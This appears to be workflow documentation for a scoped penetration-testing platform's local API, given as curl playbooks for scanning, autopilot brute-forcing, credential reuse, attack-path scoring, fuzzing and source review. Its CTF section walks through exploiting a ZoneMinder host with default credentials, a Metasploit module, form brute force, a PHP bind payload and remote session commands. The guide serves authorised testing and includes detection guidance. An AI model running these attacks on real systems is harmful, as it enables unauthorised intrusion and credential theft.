# Workflows

The playbooks. Each one is a complete path from "I have authorization" to
"here is the evidence".

---

## 1. Recon → judgement → action

**Goal:** find out what is on the estate and what is worth attacking.

```sh
# 1. scope
curl -X POST http://127.0.0.1:3137/api/engagement \
  -H 'Content-Type: application/json' \
  -d '{"name":"home lab","scope":["192.168.1.0/24"]}'

# 2. activate it
curl -X POST http://127.0.0.1:3137/api/session/scope \
  -H 'Content-Type: application/json' -d '{"engagement_id":"<id>"}'

# 3. scan
curl -X POST http://127.0.0.1:3137/api/scan \
  -H 'Content-Type: application/json' \
  -d '{"target":"192.168.1.0/24","mode":"overt","do_dns_recon":true,"depth":"standard"}'
```

Then:

* `GET /api/jobs/{id}` → poll until `done`
* `GET /api/report/{id}` → hosts, services, CVEs, credentials, posture
* `POST /api/engagement/{id}/ingest -d '{"job_id":"<id>"}'` → fold the result
  into the engagement graph so attack paths can use it

**In the UI:** Assets → `＋ Discover` → *Discover my network* chains discovery
and fingerprinting automatically.

---

## 2. The one-button walk (autopilot)

**Goal:** a full end-to-end pass with a live, named-action log.

```sh
curl -X POST http://127.0.0.1:3137/api/autopilot/start \
  -H 'Content-Type: application/json' -d '{}'
curl -s http://127.0.0.1:3137/api/autopilot/status | jq '.stage, .hosts, .log[-5:]'
```

Stages: `discovery → fingerprint → vulns → passwords → exploits → done`.

Every action is named in the log, including the targets it chose to
brute-force. Requires an active scope; without one it refuses with `403`.

---

## 3. Credential reuse → lateral movement

**Goal:** find where a known credential also works, without spraying.

```sh
# dry run first
curl http://127.0.0.1:3137/api/engagement/<id>/propagate/plan | jq '.pairs'

# then, explicitly
curl -X POST http://127.0.0.1:3137/api/engagement/<id>/propagate \
  -H 'Content-Type: application/json' -d '{"open_sessions":false}'
```

Results land in `cred_access`; the graph emits a `pivot` edge only where a
login actually succeeded. A miss is recorded in the attempt ledger and never
retried.

---

## 4. Crown jewels → attack paths

**Goal:** know what actually matters before you spend the night on it.

```sh
# declare the objective
curl -X POST http://127.0.0.1:3137/api/engagement/<id>/crown-jewels \
  -H 'Content-Type: application/json' \
  -d '{"host":"192.168.1.1","label":"router/DC","value":90}'

# compute the paths
curl http://127.0.0.1:3137/api/engagement/<id>/attack-paths | jq '.paths[] | {entry, nodes, hops, score}'
```

Each path shows the entry point, the hop chain, the vulns on the way, the
ATT&CK techniques involved and a score. Paths are evidence-backed: only
verified credential edges are used.

---

## 5. ATT&CK + detection guidance

**Goal:** hand the defender something they can act on.

```sh
curl http://127.0.0.1:3137/api/engagement/<id>/attck | jq '.techniques'
curl http://127.0.0.1:3137/api/engagement/attck/techniques | jq '.[0]'
```

Every technique carries log sources, event IDs and a short "what to look for".

---

## 6. Crash → minimize → triage → patch → verify

**Goal:** turn a fuzzing crash into a fix.

1. **Fuzz** your own service (Fuzz tab, or `POST /api/fuzz`).
2. **Minimize** — `POST /api/fuzz/minimize` reduces the input to the smallest
   trigger (libFuzzer `-minimize_crash=1`).
3. **Triage** — `POST /api/source/triage` maps the crash to a bug class and a
   CWE, and proposes a patch direction.
4. **AI assist** — `POST /api/source/ai/loop` (keyless local relay or any
   OpenAI-compatible gateway) produces a root cause and a patch candidate.
5. **Verify** — re-fuzz the patched build; the crash must disappear.

For the bundled lab:

```sh
cd vulnlab && docker build -t vulnlab . && \
  docker run --rm --name vulnlab -p 127.0.0.1:8080:8080 vulnlab
```

---

## 7. Win a CTF box, end to end (kill-chain playbook)

**Goal:** discover → recon → exploit → pivot → persist → score, with every
step verified instead of assumed. Worked example: a ZoneMinder 1.36.35 box
with default creds `admin:admin`.

```sh
# 1. DISCOVER — scope first, then sweep. Only in-scope hosts are recorded.
curl -X POST .../api/engagement -d '{"name":"ctf","scope":["192.168.1.0/24"]}'
curl -X POST .../api/session/scope -d '{"engagement_id":"<id>"}'
curl -X POST .../api/neighbors/scan
curl -X POST .../api/scan -d '{"target":"192.168.1.84","mode":"overt"}'

# 2. RECON — fingerprint for banners, correlate CVEs, list cred targets
curl -X POST .../api/neighbors/fingerprint -d '{"ip":"192.168.1.84"}'
curl .../api/neighbors/fingerprint/results/<job>   # service → version
curl .../api/neighbors/vulns                        # banner-aware CVE hits
curl .../api/passattack/targets                     # ssh:22 + http:80
curl -X POST .../api/webprobe -d '{"host":"192.168.1.84","port":80}'
```

Two hard-won rules, both now enforced by the platform:

* **A job id is not a shell.** `/api/attack` reports `success` only when a
  live session is confirmed (it polls msfrpcd for a genuinely new session).
  `failed: module ran as job N; no session opened` means the module ran but
  nothing called home — tune payload/LHOST and re-fire, don't celebrate.
  `/api/sessions` marks recorded-but-dead sessions `alive:false`.
* **Bind beats reverse from a container.** The auto-detected `LHOST` is the
  container's bridge IP (e.g. `172.18.0.3`), unroutable from the target, and
  the host firewall typically drops inbound callbacks. So prefer a bind
  payload and let msf connect *out* (which always works):
  `"options":{"PAYLOAD":"php/bind_php","LPORT":4445}`.
  `PAYLOAD`/`LHOST`/`LPORT` always pass through `/api/attack` options.

```sh
# 3. EXPLOIT — check first (no exploitation), then fire; bind beats reverse
curl -X POST .../api/attack -d '{"target":"192.168.1.84","host":"192.168.1.84",
  "module":"exploit/unix/webapp/zoneminder_lang_exec",
  "options":{"USERNAME":"admin","PASSWORD":"admin","TARGETURI":"/"},
  "check_only":true}'
curl -X POST .../api/attack -d '{"target":"192.168.1.84","host":"192.168.1.84",
  "module":"exploit/unix/webapp/zoneminder_lang_exec","port":80,
  "options":{"USERNAME":"admin","PASSWORD":"admin","TARGETURI":"/"}}'
# HTML form logins get their own brute force (fail = failed-login-only marker):
curl -X POST .../api/passattack -d '{"host":"192.168.1.84","service":"http-form",
  "form":{"path":"/index.php","fail":"name=\"username\""}}'
# render stagers/callbacks offline for manual triggers:
curl -X POST .../api/payload -d '{"payload":"php/bind_php","options":{"LPORT":4445}}'

# 4. PIVOT — shells, cred replay, route map, interrogation
curl .../api/sessions                    # alive:true = usable
curl -X POST .../api/sessions/1/cmd -d '{"command":"id; hostname"}'
curl -X POST .../api/lateral -d '{"cidr":"192.168.1.0/24"}'
curl -X POST .../api/engagement/<id>/propagate/plan
curl -X POST .../api/db_interrogate -d '{"target":"192.168.1.84"}'

# 5. PERSIST — hold the win: live sessions + banked creds + captured flags.
# Re-entry is propagation replay, not an implant:
curl -X POST .../api/engagement/<id>/propagate -d '{"open_sessions":false}'

# 6. SCORE — flags, objective, writeup
curl -X POST .../api/engagement/<id>/flags -d '{"value":"CTF{...}","host":"192.168.1.84"}'
curl .../api/engagement/<id>/next-move   # what to do next, ranked
curl .../api/session/report?fmt=md       # the disclosure-ready writeup
```

---

## 8. Source analysis → disclosure
**Goal:** review third-party code you were asked to look at.

```sh
# SAST (Semgrep + heuristics)
curl -X POST http://127.0.0.1:3137/api/source/scan \
  -H 'Content-Type: application/json' -d '{"repo":"https://github.com/org/repo"}'

# SCA (needs a committed lockfile to be honest about CVEs)
curl -X POST http://127.0.0.1:3137/api/source/sca \
  -H 'Content-Type: application/json' -d '{"repo":"https://github.com/org/repo"}'

# PoC skeleton for responsible disclosure
curl -X POST http://127.0.0.1:3137/api/source/exploit \
  -H 'Content-Type: application/json' -d '{"name":"<finding>"}'
```

---

## 8. One consolidated report

```sh
curl -X POST http://127.0.0.1:3137/api/source/report/merge -d '{}' \
  -H 'Content-Type: application/json'
curl http://127.0.0.1:3137/api/source/report/md
```

Merges scan + SAST + SCA + fuzz + triage into one markdown writeup.
